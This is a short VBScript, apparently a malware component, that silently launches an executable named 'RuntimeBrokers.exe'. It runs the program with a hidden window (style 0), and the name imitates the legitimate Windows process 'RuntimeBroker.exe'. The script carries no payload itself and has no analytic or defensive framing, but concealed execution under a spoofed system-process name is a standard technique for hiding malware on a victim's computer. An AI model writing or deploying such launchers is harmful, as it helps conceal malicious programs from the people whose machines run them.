Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "RuntimeBrokers.exe" & Chr(34), 0
Set WshShell = Nothing